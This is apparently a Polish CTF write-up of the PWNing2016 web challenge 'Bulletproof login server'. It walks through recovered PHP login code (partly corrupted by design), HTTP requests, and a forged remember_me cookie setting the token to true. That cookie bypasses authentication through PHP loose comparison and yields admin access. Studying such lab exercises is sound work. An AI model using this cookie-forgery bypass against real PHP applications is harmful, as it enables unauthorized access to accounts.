---
title: Bulletproof login server™ - PWNing2016
author: k1k9
categories: [PWNing2016, web]
tags: [ctf, pwning2016]
---
# Bulletproof login server™ 
Punkty: 100
Rozwiązań: 49

Panel admina firmy Januszex z Randomia. Nie włamiesz się.
Link: https://monk.pwning2016.p4.team
Udało nam się znaleźć na śmietniku ich stary dysk twardy z którego odzyskaliśmy część kodu strony.

# Rozezeznanie
Mamy dostępne dwa linki, jeden do strony a drugi do kodu pliku o nazwie ```admin.php.corrupted.txt```
![jeden do strony](/assets/posts/bulletproof-login-server-tm/1.png)

## admin.php.corrupted.txt
Zaczniemy od analizy pliku ```admin.php.corrupted.txt```. Kod w pliku prezentuje się tak:
```php
<?php

require('../auth_funcs.php');

ini_set('display_errors', 1);
error_reporting(E_ALL);
$auth = false;

if (isset($_COOKIE['remember_me'])) {
    $obj = json_decode($_COOKIE['remember_me'], true);
    
    if ($obj['login'] == 'demo' && $obj['token'] == getUserAuthToken('demo')) {
        $auth = 'demo';
    }
    
    if ($obj['login'] == 'admin' && $obj['token'] == getUserAuthToken('admin')) {
        $auth = 'admin';
    }
}

if (!$auth) {
    echo('Sorry, you are not authenticated :(<br>');

    if (isset($_COOKIE['remember_me'])) {
        echo('<pre>'.htmlentities(var_ex�
�z��٥o��������Bo�>�P{w`^��X�1L�YYO��Z�)M�>��*����z�r4�9�����z0���m��ܵ������Z�
-0�5(��o���i���p#74�pKLʒ�fj�J�b���AqF�];3y�-R����;�x�H�HpQ�`d�ڧ��
q�@C����8
�*��R�P<���X���E>Y@_(�;0�߷��}��#�H#�H��h�e]Њ��m��=r�K�i)�Ǝ�Ϡ�^J���c�7�c갚Q��Z�<�m�M��-&UwZ��I�K
T���;�f��9d�iFuo0���l��$�Q{�w>s��i�~�`����	Di+�\�}y"��vq���7]���F���+'7�i��&?��l���Ȑ��+���%��[�/�gnh�¸G�Ǆ����.�d�PD��{�����y>�В�H"u�,|;1ן�*�A����d#�&S%�4�ς�)�hL,�-d��n��4���b�9�;��q�/�g�D�N~�����}u�Q-G��Me���*eܙ@?(�e��G��bA��^ �ʅ��6,G-x���Ia��ɩv3]�{��*�P&ڐ�;E�2?f�9�'�ҩ�+��u���A�P�'���QEH�OJ����3�Vk�
�
qoIq�{���Du1��eZ)�w��P:h������@�J+�����Be��+�\����vy���d� T�Jş=X]N�U��������Ed���a���~�<@\���V�e�Y��ޕN-�-�o��͕�Q$�(�
Rb���"�"+��>����������<��ZYC�+�#*��x�氹:M��W��LY8c�vgˑ�"��`�E[R���x�����s�(��͈qV2�ۤ�p�t�K�7GMT%>���/�l^�,�P���@�:��T�>r�w>	�����N~!�b�� �݋}��9̷
o���󮶭�3�J�s
1��NcE�=���#�I_��T�F
;񢢤�-	m���U�՛�[D
�w����{a�{x��tb,G�����~Pj��Jt`�S�%>l�����%������Q��J��"&Y<�8NB����R�%����{������+��^��C����M������ )�Z�\;��4��;[��r�b�+�
�X}H+8�b)���X��*��m�0�!�+����9cBJ�oW����,�}���VJ{�c����_c��v��-/USo���pQ��X��aj�l4脷�*�P��)ƹq(o*�dfR��Bv���z�@�6ܾ?��l��ZtۊǿG��I�o#�����QDY8�Wԗ�8�>:��yr��5Y�;�JɎ�T�����3���fdAI�3n7���vԽ�ꓠg��I^#�ޘ}��iP�=j����n��W�[�Z���[v�T1q[�DS^�l�Y�C��\���C�LF��r80�?�N9_�Bz��.o�)
�MP�4@���-J�/T����������ýv�fJ<�jg ���3���z.v�d��ğ�[P��g!2ͤ�yQ3�������C������,x��p<R5+)5�2�E�#/�[9��֎��[�T�S��H�G����	D��m�S���k��t�!��`�Q��݆�����A�$��&A�\��ځk����{k'��ɗ �C%���Kl�M�#]�?=Ub(g�8!ˏ��~���CUí��8�@���iȣ���=D��Q�7R'�B0����!0PU���]�8���5*�F�,�0������?9/w`��	T.>ͫc~���
�k���Bc��0����`���զ5C�l����.*�(���opGAB��m��<��Pl�ie�E�Q�b����ZGɒ�-�w�Oq�W�������y�M�N�CfB������e"�<(X�m�i@j%^��<$C��V4�! _}�����R����!mz]!��9������s�9߰,�}��8٣�!�����p�X�����4�5�p��|m�Z�}*�H�Vh��V
```
A oto moje wnioski:
1.  Uwierzytelnianie użytkownika opiera się na ciasteczku ```remember_me```, które składa się z _loginu_ (```admin``` || ```demo```) oraz _tokenu_, który jest sprawdzany za pomocą funkcji ```getUserAuthToken(<login>)```.
2. Jeżeli nie jesteśmy zalogowani a ciasteczko ```remember_me``` jest ustawione, to zostanie wywołany kod echo.

Niewiele informacji ale sprawdźmy reszte

## login.php
Po wejściu na strone widzimy panel logowania, który informuje nas o użytkowniku demo (natkneliśmy się na niego również w kodzie, wcześniej) oraz o haśle jakie ma. 
![2](/assets/posts/bulletproof-login-server-tm/2.png)

Po zajrzeniu w kod strony nic po za bootstrapem i formularzem ciekawego nie ma:
```html
<form action="" method="POST" enctype="multipart/form-data">
    <div class="form-group">
    <label for="login">Login</label>
    <input type="text" name="login" class="form-control">
    </div>
    <div class="form-group">
    <label for="password">Password</label>
    <input type="password" name="password" class="form-control">
    </div>
    <div class="checkbox">
    <label>
        <input type="checkbox" checked disabled> For your convenience we always remember you.
    </label>
    </div>
    <button type="submit" class="btn btn-default">Submit</button>
</form>
```

Sprawdzę jak wygląda wysyłanie requestu logowania:
### Błędne dane
```http
POST /login.php HTTP/2
Host: monk.pwning2016.p4.team
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------264215124639808579761785133742
Content-Length: 296
Origin: https://monk.pwning2016.p4.team
Connection: keep-alive
Referer: https://monk.pwning2016.p4.team/login.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
TE: trailers

-----------------------------264215124639808579761785133742
Content-Disposition: form-data; name="login"

1337
-----------------------------264215124639808579761785133742
Content-Disposition: form-data; name="password"

1337
-----------------------------264215124639808579761785133742--
```
Odpowiedź nie jest interesująca

### Konto demo
```http
POST /login.php HTTP/2
Host: monk.pwning2016.p4.team
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: pl,en-US;q=0.7,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------164494905017473373402467738118
Content-Length: 299
Origin: https://monk.pwning2016.p4.team
Connection: keep-alive
Referer: https://monk.pwning2016.p4.team/login.php
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1

-----------------------------164494905017473373402467738118
Content-Disposition: form-data; name="login"

demo
-----------------------------164494905017473373402467738118
Content-Disposition: form-data; name="password"

demo123
-----------------------------164494905017473373402467738118--
```
Od razu możemy zauważyć, że ```Content-Type: multipart/form-data; boundary=``` różni się od poprzedniego. Odpowiedź:
```http
HTTP/2 302 Found
server: nginx
date: Mon, 19 Jun 2023 05:15:40 GMT
content-type: text/html; charset=UTF-8
content-length: 0
set-cookie: remember_me=%7B%22login%22%3A%22demo%22%2C%22token%22%3A%22f0d34353e4de11b28825dc2a5736c17504804013%22%7D; expires=Mon, 03-Jul-2023 05:15:40 GMT; Max-Age=1209600
location: admin.php
X-Firefox-Spdy: h2
```
Natomiast w odpowiedzi zostaje ustawione ciasteczko:
```json
{"login":"demo","token":"f0d34353e4de11b28825dc2a5736c17504804013"}
```
Jeżeli podmienimy ciasteczko na:
```json
{"login":"demo","token":"0000000000000000000000000000000000000000"}
```
otrzymamy:
![3](/assets/posts/bulletproof-login-server-tm/3.png)
Czyli już mniej więcej wiemy za co odpowiada wcześniej analizowany przeze mnie kod. Sprawdźmy czy jest tu możliwe wykonanie wrzucenie czegoś innego. Wyślemy:
```sh
{"login":"admin","token":true}
```
Po sformatowaniu na poprawne URL mamy:
```sh
%7B%22login%22:%22admin%22,%22token%22:true%7D
```
Oj i mamy flagę.

## Podsumowanie
Po przeanalizowaniu kodu jeszcze raz okazuje się, że kod który był zaciemniony jest niepotrzebny a cały problem polegał na walidacji danych:
```php
if ($obj['login'] == 'admin' && $obj['token'] == getUserAuthToken('admin'))
```
Problemem jest użycie operatora ```==``` zamiast ```===``` powoduje to rzutowanie zwracanej wartości funkcji ```getUserAuthToken('admin')``` na wartość boolowską a z racji, że jest to nie pusty string to otrzymujemy true, gdzie finalnie otrzymujemy ```true == true```